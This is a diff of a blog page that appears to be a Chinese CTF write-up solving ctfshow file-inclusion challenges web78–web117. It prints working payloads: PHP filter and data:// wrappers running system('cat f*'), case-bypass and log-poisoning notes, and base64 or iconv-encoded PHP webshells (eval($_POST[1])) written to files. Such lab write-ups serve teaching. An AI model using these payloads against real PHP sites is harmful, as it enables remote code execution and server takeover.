@@ -7,7 +7,8 @@
   <meta name="description" content="web78
 php伪协议即可
 payload:?file&amp;#x3D;php:&amp;#x2F;&amp;#x2F;filter&amp;#x2F;read&amp;#x3D;convert.base64-encode&amp;#x2F;resource&amp;#x3D;flag.php
-web79">
+web79
+过滤了php,用其他伪协议，我这里用data">
 
 
 <link rel="alternate" href="/atom.xml" title="ccgetflag" type="application/atom+xml">
@@ -47,7 +48,36 @@ web79">
 <section id="post-body"><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p><img src="/source/images/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.png"></p>
 <p>php伪协议即可</p>
 <p>payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
-<h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3></section>
+<h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p><img src="/source/images/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/2.png"></p>
+<p>过滤了php,用其他伪协议，我这里用data伪协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?=system(&#x27;cat f*&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><p><img src="/source/images/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/3.png"></p>
+<p>过滤了php和data，大小写绕过即可</p>
+<p><img src="/source/images/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/4.png"></p>
+<p>phP:&#x2F;&#x2F;input然后post传参上面代码即可</p>
+<h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><p><img src="/source/images/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/5.png"></p>
+<p>过滤了:号，利用日志文件漏洞来写</p>
+<p><img src="/source/images/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240911155221879.png" alt="image-20240911155221879"></p>
+<h3 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h3><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><p><img src="/source/images/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/7.png"></p>
+<p>php伪协议绕过死亡die</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/write=convert.base64-decode/resource=c.php</span><br></pre></td></tr></table></figure>
+
+<p>进行两次url编码</p>
+<p>然后post传参</p>
+<p>content&#x3D;aaPD9waHAgc3lzdGVtKCdjYXQgZionKTs&#x2F;Pg&#x3D;&#x3D;</p>
+<p>然后访问c.php查看源代码即可</p>
+<h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><p><img src="/source/images/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/8.png"></p>
+<p>过滤了php，用data协议即可</p>
+<p>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZionKTs&#x2F;Pg</p>
+<h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><p>很有意思的web，有点像misc</p>
+<p>把视频下载之后010分析，发现png图片，然后down下来，直接传参?file&#x3D;flag.php</p>
+<p>抓包就能看到flag</p>
+<h3 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h3><p><img src="/source/images/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/9.png"></p>
+<p>额这个过滤器属实没搞明白。</p>
+<p>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;a.php</p>
+<p>contents&#x3D;?&lt;hp pvela$(P_SO[T]1;)&gt;?</p>
+</section>
     
         
         <h2 class="footline">
